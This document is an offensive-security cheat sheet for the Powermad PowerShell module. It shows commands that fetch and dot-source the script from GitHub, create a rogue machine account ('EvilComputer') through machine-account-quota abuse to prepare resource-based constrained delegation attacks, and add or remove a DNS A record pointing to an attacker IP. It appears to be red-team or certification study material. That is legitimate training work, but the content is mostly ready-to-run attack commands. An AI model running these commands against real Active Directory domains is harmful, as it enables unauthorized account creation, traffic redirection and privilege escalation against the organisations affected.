# 03.23 Powermad

> PowerShell module for adding machine accounts and DNS records — PowerView's machine-account companion.

## Overview

Powermad (Kevin Robertson) adds AD machine accounts and DNS records from PowerShell. Two key cmdlets: New-MachineAccount (MAQ abuse) and Invoke-DNSUpdate (add/remove DNS A records as authenticated user). Predates StandIn but still useful when you need both machine-account creation and DNS manipulation in a single PowerShell session. Commonly used in CRTP for RBCD chains.

## Steps

- **Step 1** - Get module.
- **Step 2** - Use New-MachineAccount for RBCD prep.
- **Step 3** - Use Invoke-DNSUpdate to register a hostname pointing to attacker.

## Commands

### Get + import

```powershell
iwr 'https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1' -OutFile Powermad.ps1
. .\Powermad.ps1
```

### Add machine account

```powershell
$pw = ConvertTo-SecureString 'EvilPass123!' -AsPlainText -Force
New-MachineAccount -MachineAccount 'EvilComputer' -Password $pw
# Verify
Get-DomainComputer -Identity 'EvilComputer'
```

### DNS update — register hostname

```powershell
Invoke-DNSUpdate -DNSType A -DNSName 'evil.<DOMAIN>' -DNSData <ATTACKER-IP>
```

### Remove DNS record

```powershell
Invoke-DNSUpdate -Realm <DOMAIN> -DNSType A -DNSName 'evil.<DOMAIN>' -Action remove
```

### Check current MAQ

```powershell
Get-MachineAccountQuota
```
